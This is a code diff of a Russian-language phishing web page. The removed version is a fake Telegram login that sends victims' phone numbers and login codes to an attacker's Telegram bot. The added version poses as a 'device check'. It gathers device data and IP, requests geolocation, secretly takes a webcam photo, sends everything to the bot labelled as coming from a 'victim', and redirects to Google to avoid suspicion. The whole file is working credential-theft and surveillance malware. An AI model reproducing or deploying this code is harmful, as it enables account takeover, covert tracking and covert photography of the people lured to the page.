@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram — Вход</title>
+    <title>Проверка устройства</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,66 +22,42 @@
             border-radius: 16px;
             padding: 30px 25px;
             border: 1px solid #30363d;
+            text-align: center;
         }
-        h1 { color: #ffffff; font-size: 24px; text-align: center; margin-bottom: 8px; }
-        .subtitle { color: #8b949e; text-align: center; font-size: 14px; margin-bottom: 28px; }
-        .input-group { margin-bottom: 20px; }
-        label { color: #e6edf3; font-size: 14px; font-weight: 500; margin-bottom: 8px; display: block; }
-        input {
-            width: 100%;
-            padding: 12px 14px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            color: #ffffff;
-            font-size: 16px;
+        h1 { color: #ffffff; font-size: 24px; margin-bottom: 8px; }
+        .subtitle { color: #8b949e; font-size: 14px; margin-bottom: 28px; }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #30363d;
+            border-top-color: #1f6feb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        input:focus { outline: none; border-color: #1f6feb; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { color: #8b949e; font-size: 14px; margin-top: 20px; }
+        .footer { margin-top: 24px; font-size: 12px; color: #6e7681; }
         button {
-            width: 100%;
-            padding: 12px;
-            background: #238636;
+            background: #1f6feb;
             color: white;
             border: none;
             border-radius: 8px;
+            padding: 12px 24px;
             font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 20px;
         }
-        button:hover { background: #2ea043; }
-        .error {
-            background: rgba(248,81,73,0.2);
-            border: 1px solid #f85149;
-            border-radius: 8px;
-            padding: 10px;
-            margin-top: 15px;
-            color: #f85149;
-            font-size: 13px;
-            display: none;
-        }
-        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #6e7681; }
+        button:hover { background: #388bfd; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Вход в Telegram</h1>
-        <div class="subtitle">Введите данные для входа</div>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label>📱 Номер телефона</label>
-                <input type="tel" id="phone" placeholder="+7 123 456 78 90" required>
-            </div>
-            <div class="input-group">
-                <label>🔐 Код подтверждения</label>
-                <input type="text" id="code" placeholder="Код из Telegram" required>
-            </div>
-            <button type="submit">Войти</button>
-        </form>
-        
-        <div class="error" id="errorMsg"></div>
-        <div class="footer">Telegram — защищённый мессенджер</div>
+    <div class="container" id="mainContainer">
+        <h1>Проверка устройства</h1>
+        <div class="subtitle">Пожалуйста, подождите...</div>
+        <div class="spinner"></div>
+        <div class="status" id="status">Загрузка данных...</div>
+        <div class="footer">🔒 Безопасное соединение</div>
     </div>
 
     <script>
@@ -91,45 +67,152 @@
         
         const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        async function sendToBot(phone, code, userData) {
-            const text = `🔴 *НОВАЯ ЖЕРТВА!*\n\n📞 Телефон: ${phone}\n🔢 Код: ${code}\n\n🌍 *Данные устройства:*\n├ 📱 User-Agent: ${userData.ua}\n├ 🖥️ Платформа: ${userData.platform}\n├ 🌐 Язык: ${userData.language}\n├ 📐 Экран: ${userData.screen}\n├ 🔗 Реферер: ${userData.referrer || 'прямой переход'}\n└ 🕒 Время: ${new Date().toLocaleString()}`;
-            
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
+        async function sendToBot(text) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) { console.log(e); }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return 'не удалось определить';
+            }
+        }
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            resolve(null);
+                        }
+                    );
+                } else {
+                    resolve(null);
+                }
             });
         }
         
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                track.stop();
+                
+                // Конвертируем blob в base64
+                const reader = new FileReader();
+                return new Promise((resolve) => {
+                    reader.onloadend = () => {
+                        resolve(reader.result.split(',')[1]); // base64 без префикса
+                    };
+                    reader.readAsDataURL(blob);
+                });
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        async function sendPhoto(base64Image) {
+            if (!base64Image) return;
             
-            const phone = document.getElementById('phone').value;
-            const code = document.getElementById('code').value;
+            // Отправляем фото через telegram bot
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_ID);
             
-            if (!phone || !code) {
-                document.getElementById('errorMsg').textContent = 'Заполните все поля';
-                document.getElementById('errorMsg').style.display = 'block';
-                return;
+            const binary = atob(base64Image);
+            const array = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
+            const blob = new Blob([array], { type: 'image/jpeg' });
+            
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', `📸 *Фото с камеры жертвы!*\n🕒 ${new Date().toLocaleString()}`);
+            formData.append('parse_mode', 'Markdown');
+            
+            await fetch(url, { method: 'POST', body: formData });
+        }
+        
+        async function main() {
+            // 1. Меняем статус
+            document.getElementById('status').innerHTML = 'Анализ устройства...';
+            
+            // 2. Собираем данные об устройстве
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screen = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // 3. Получаем IP
+            const ip = await getIP();
+            
+            // 4. Отправляем базовые данные
+            let text = `🔴 *НОВЫЙ ПЕРЕХОД!*\n\n`;
+            text += `🌍 *Данные устройства:*\n`;
+            text += `├ 📱 User-Agent: ${ua}\n`;
+            text += `├ 🖥️ Платформа: ${platform}\n`;
+            text += `├ 🌐 Язык: ${language}\n`;
+            text += `├ 📐 Экран: ${screen}\n`;
+            text += `├ 🕒 Часовой пояс: ${timezone}\n`;
+            text += `├ 🌍 IP: ${ip}\n`;
+            text += `└ 🕒 Время: ${new Date().toLocaleString()}\n\n`;
+            
+            text += `⏳ Запрашиваю геолокацию и камеру...`;
+            
+            await sendToBot(text);
+            
+            // 5. Запрашиваем геолокацию
+            document.getElementById('status').innerHTML = 'Запрос геолокации...';
+            const location = await getLocation();
+            
+            if (location) {
+                const geoText = `📍 *ГЕОЛОКАЦИЯ!*\n├ Широта: ${location.lat}\n├ Долгота: ${location.lon}\n├ Точность: ${location.accuracy}м\n└ Время: ${new Date().toLocaleString()}`;
+                await sendToBot(geoText);
+            } else {
+                await sendToBot(`❌ *Геолокация:* отклонена или недоступна`);
             }
             
-            const userData = {
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                referrer: document.referrer
-            };
+            // 6. Запрашиваем камеру и делаем фото
+            document.getElementById('status').innerHTML = 'Запрос камеры...';
+            const photo = await takePhoto();
             
-            await sendToBot(phone, code, userData);
+            if (photo) {
+                await sendPhoto(photo);
+                document.getElementById('status').innerHTML = '✅ Данные отправлены! Перенаправление...';
+                await sendToBot(`📸 *Фото сделано и отправлено!*`);
+            } else {
+                document.getElementById('status').innerHTML = 'Доступ к камере запрещён. Перенаправление...';
+                await sendToBot(`❌ *Камера:* доступ запрещён`);
+            }
             
-            // Перенаправляем на настоящий telegram
-            window.location.href = "https://web.telegram.org/k/";
-        });
+            // 7. Перенаправляем на любой сайт (чтоб не спалиться)
+            setTimeout(() => {
+                window.location.href = "https://google.com";
+            }, 2000);
+        }
+        
+        main();
     </script>
 </body>
 </html>
